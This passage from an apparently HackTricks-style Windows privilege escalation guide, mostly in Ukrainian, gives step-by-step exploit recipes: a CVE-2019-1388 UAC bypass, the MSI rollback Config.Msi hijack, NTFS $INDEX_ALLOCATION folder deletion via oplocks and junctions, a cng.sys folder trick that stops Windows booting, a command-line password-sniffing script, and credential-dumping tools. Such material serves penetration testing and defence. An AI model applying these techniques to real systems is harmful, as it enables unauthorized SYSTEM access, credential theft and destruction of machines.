- Add yourself to `[TapiAdministrators]` in `C:\\Windows\\TAPI\\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

Більше деталей:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Різне

### File Extensions that could execute stuff in Windows

Перегляньте сторінку **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

Коли ви отримуєте shell як користувач, можуть бути заплановані завдання або інші процеси, які виконуються та **передають облікові дані в командному рядку**. Наведений нижче скрипт захоплює командні рядки процесів кожні дві секунди та порівнює поточний стан з попереднім, виводячи будь-які відмінності.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Викрадення паролів з процесів

## Від користувача з низькими привілеями до NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Якщо у вас є доступ до графічного інтерфейсу (через консоль або RDP) і UAC увімкнено, в деяких версіях Microsoft Windows можливо запустити terminal або будь-який інший процес, такий як "NT\AUTHORITY SYSTEM", з непідпривілейованого користувача.

Це дозволяє підвищити привілеї та обійти UAC одночасно використовуючи ту саму вразливість. Крім того, немає потреби нічого встановлювати, а бінарний файл, який використовується в процесі, підписаний і виданий Microsoft.

Деякі з уражених систем:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Щоб експлуатувати цю вразливість, необхідно виконати такі кроки:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Атака, по суті, полягає в зловживанні функцією rollback у Windows Installer для заміни легітимних файлів на шкідливі під час процесу деінсталяції. Для цього атака має створити **malicious MSI installer**, який буде використано для перехоплення папки `C:\Config.Msi`, яку пізніше Windows Installer використає для збереження rollback файлів під час деінсталяції інших MSI пакетів, де файли rollback будуть змінені для містити шкідливий payload.

Стислий опис техніки:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion**?

Ви можете експлуатувати **внутрішні структури NTFS**: кожна папка має прихований альтернативний потік даних (alternate data stream) під назвою:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Цей потік зберігає **метадані індексу** папки.

Отже, якщо ви **видалите потік `::$INDEX_ALLOCATION` папки**, NTFS **видалить всю папку** з файлової системи.

Ви можете зробити це, використовуючи стандартні API видалення файлів, наприклад:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Навіть якщо ви викликаєте *file* delete API, воно **видаляє саму папку**.

### Від Folder Contents Delete до SYSTEM EoP
Що якщо ваш примітив не дозволяє видаляти довільні файли/папки, але він **дозволяє видаляти *вміст* папки, контрольованої атакуючим**?

1. Крок 1: Підготуйте папку-приманку та файл
- Створіть: `C:\temp\folder1`
- Всередині неї: `C:\temp\folder1\file1.txt`

2. Крок 2: Розмістіть **oplock** на `file1.txt`
- The oplock **призупиняє виконання**, коли привілейований процес намагається видалити `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Крок 3: Запустіть процес SYSTEM (наприклад, `SilentCleanup`)
- Цей процес сканує папки (наприклад, `%TEMP%`) і намагається видалити їхній вміст.
- Коли він доходить до `file1.txt`, **oplock triggers** і передає контроль вашому callback.

4. Крок 4: Усередині oplock callback – перенаправте видалення

- Варіант A: Перемістіть `file1.txt` в інше місце
- Це звільняє `folder1` без порушення oplock.
- Не видаляйте `file1.txt` безпосередньо — це передчасно звільнить oplock.

- Варіант B: Перетворіть `folder1` у **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Варіант C: Створити **symlink** в `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Це спрямовано на внутрішній потік NTFS, який зберігає метадані папки — видаливши його, видаляється і папка.

5. Крок 5: Звільнення oplock
- Процес SYSTEM продовжує і намагається видалити `file1.txt`.
- Але тепер, через junction + symlink, він фактично видаляє:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Результат**: `C:\Config.Msi` видаляється SYSTEM.

### Від Arbitrary Folder Create до Permanent DoS

Використайте примітив, який дозволяє вам **create an arbitrary folder as SYSTEM/admin** — навіть якщо **ви не можете записувати файли** або **встановлювати слабкі дозволи**.

Створіть **папку** (не файл) з ім'ям **критичного драйвера Windows**, наприклад:
```
C:\Windows\System32\cng.sys
```
- Цей шлях зазвичай відповідає драйверу в режимі ядра `cng.sys`.
- Якщо ви **заздалегідь створите його як папку**, Windows не зможе завантажити фактичний драйвер під час завантаження.
- Потім Windows намагається завантажити `cng.sys` під час завантаження.
- Вона бачить папку, **не може знайти фактичний драйвер**, і **викликає збій або зупиняє завантаження**.
- Немає **резервного варіанта**, і **немає способу відновлення** без зовнішнього втручання (наприклад, відновлення завантаження або доступ до диска).


## **З High Integrity до System**

### **Нова служба**

Якщо ви вже працюєте в процесі High Integrity, **шлях до SYSTEM** може бути простим — просто **створити та запустити нову службу**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Під час створення сервісного бінарного файлу переконайтеся, що це дійсний сервіс або що бінар виконує необхідні дії швидко, оскільки його буде завершено через 20с, якщо це не дійсний сервіс.

### AlwaysInstallElevated

З процесу High Integrity ви можете спробувати **увімкнути записи реєстру AlwaysInstallElevated** та **встановити** reverse shell за допомогою обгортки _**.msi**_.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Якщо у вас є ці token привілеї (ймовірно ви знайдете їх у вже існуючому процесі High Integrity), ви зможете **відкрити майже будь-який процес** (не protected processes) з привілеєм SeDebug, **скопіювати токен** процесу та створити **довільний процес з цим токеном**.\
Зазвичай для цієї техніки **вибирають будь-який процес, що працює як SYSTEM з усіма token privileges** (_так, можна знайти SYSTEM процеси без усіх token privileges_).\
**Приклад коду, що реалізує цю техніку, можна знайти тут** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Цю техніку використовує meterpreter для ескалації в `getsystem`. Техніка полягає в **створенні pipe і подальшому створенні/зловживанні сервісом для запису в цей pipe**. Потім **сервер**, який створив pipe з використанням привілею **`SeImpersonate`**, зможе **імітувати token** клієнта pipe (сервіс), отримавши SYSTEM привілеї.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Якщо вам вдасться **hijack a dll**, що **завантажується** процесом, який працює як **SYSTEM**, ви зможете виконувати довільний код з цими правами. Тому Dll Hijacking також корисний для такого роду ескалації привілеїв і, що важливіше, значно **легше досяжний з процесу high integrity**, оскільки такий процес матиме **write permissions** на папках, які використовуються для завантаження dll.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Прочитати:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Корисні інструменти

**Найкращий інструмент для пошуку локальних векторів ескалації привілеїв Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевіряє на помилки конфігурації та конфіденційні файли (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Виявлено.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевіряє можливі помилки конфігурації та збирає інформацію (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевіряє на помилки конфігурації**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Дістає збережену інформацію сесій PuTTY, WinSCP, SuperPuTTY, FileZilla та RDP. Використовуйте -Thorough локально.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Витягує облікові дані з Credential Manager. Виявлено.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Використовує зібрані паролі для атак по домену**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh є PowerShell інструментом для спуфінгу ADIDNS/LLMNR/mDNS/NBNS та man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Базова Windows-енумерація для privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Шукає відомі privesc уразливості (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(Потрібні права Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Шукає відомі privesc уразливості (потрібно скомпілювати за допомогою VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перераховує хост у пошуках помилок конфігурації (більше інструмент збору інформації ніж privesc) (потрібно скомпілювати) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує облікові дані з численних програм (precompiled exe на GitHub)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Порт PowerUp на C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Перевірка на помилки конфігурації (виконуваний файл попередньо зібраний на GitHub). Не рекомендовано. Погано працює в Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевіряє на можливі помилки конфігурації (exe з python). Не рекомендовано. Погано працює в Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Інструмент створений на основі цього посту (не потребує accesschk для коректної роботи, але може його використовувати).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Читає вихід **systeminfo** і рекомендує працюючі експлойти (локальний python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Читає вихід **systeminfo** і рекомендує працюючі експлойти (локальний python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Потрібно скомпілювати проект, використовуючи правильну версію .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб побачити встановлену версію .NET на хості жертви, ви можете:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Посилання

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
